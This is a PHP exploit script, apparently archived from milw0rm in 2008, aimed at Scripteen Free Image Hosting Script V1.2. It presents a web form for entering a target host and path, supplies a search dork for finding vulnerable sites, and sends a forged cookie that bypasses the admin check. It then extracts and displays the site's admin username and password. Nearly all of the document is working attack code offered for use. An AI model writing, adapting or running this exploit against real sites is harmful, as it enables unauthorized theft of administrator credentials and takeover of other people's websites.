<?php
/*
Coded By RMx - Liz0zim
BiyoSecurity.Com & Coderx.org
Ki zava Ki Zava :)
Thanx : Crackers_Child - TR_IP - Volqan - All SQL Low3rz
*/
error_reporting("E_ALL");
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);
$desen='|value="(.*)"|siU';

function yolla($host,$paket)
{
global $veri;
$ac=fsockopen(gethostbyname($host),80);
if (!$ac) {
echo 'Unable to connect to server '.$host.':80'; exit;//BaÄŸlanamaz ise
}
fputs($ac,$paket);
$veri="";
    while (!feof($ac)) {
      $veri.=fread($ac,1);
 
  }
  fclose($ac);
}
?>
<h2>Scripteen Free Image Hosting Script V1.2.* (cookie) Admin Password Grabber Exploit</h2>
<p>Coded By RMx - Liz0ziM</p>
<p>Web:<a href="http://www.biyosecurity.com" target="_blank">www.biyosecurity.com</a> </p>
<p>Dork:"Powered by Scripteen Free Image Hosting Script V1.2"</p>
<form method="POST" action="">
<p>TARGET HOST:
  <input name="host" type="text" />
  Example:<strong>www.xxxx.com</strong></p>
<p>TARGET PATH:   <input name="klasor" type="text" />
Example:<strong>/</strong> or <strong>/scriptpath/</strong> </p>
<p><input name="yolla" type="submit" value="Send" /></p>
</form><br />
<? if($_POST[yolla]){
$host=$_POST[host];
$klasor=$_POST[klasor];
$admin=$_POST[admin];
$p=$klasor."admin/settings.php";
echo '<font color="red"><b>Sending Exploit..</b></font><br>';
$packet ="GET ".$p." HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: cookid=1\r\n";
$packet.="Connection: Close\r\n\r\n";
yolla($host,$packet);
preg_match_all($desen,$veri,$cik);
$ad=$cik[1][0];
$sifre=$cik[1][1];
if($ad AND $sifre){
echo '
<font color="green">Exploit succeeded...</font ><br>
Admin Username:<b>'.$ad.'</b><br>
Admin Password:<b>'.$sifre.'</b><br>';
}
else
{
echo '<font color="red">Exploit Failed !</font>';
}
}

?>

# milw0rm.com [2008-07-13]
